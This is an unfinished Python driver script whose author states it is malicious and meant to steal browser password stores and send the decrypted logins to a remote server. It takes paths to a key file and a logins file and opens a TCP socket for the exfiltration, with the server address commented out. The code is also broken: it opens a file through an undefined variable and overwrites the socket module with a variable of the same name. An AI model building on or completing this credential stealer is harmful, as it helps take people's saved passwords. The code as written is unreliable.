## This is the driver file for the main program.
## This program is malicious by nature, do not run unless you intend to cause damage or understand what you are doing.
## I am not responsible for any damage or trouble you may get into by running this program.

## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.

import argparse
import socket
import sys
import os

def grab_ComandLine(): # Function to grab command line arguments.
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', type=str, required=True, help='Key File')
    parser.add_argument('-l', type=str, required=True, help='Logins')
    
    args = parser.parse_args()
    keyFilePath = args.k
    loginsFilePath = args.l
    
    return keyFilePath, loginsFilePath




# Main Function
if __name__ == '__main__':
    # Initilizes the key and logins path from the provided command line arguments.
    keyFilePath, loginsFilePath = grab_ComandLine()
    
    # Next a socket is established that will be used for sending contents to a remote server
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Need to spin up a test environment for this.
    # serverAddress = (IP, Port)
    # Open a file for logging purposes
    log = open(log,"w")
    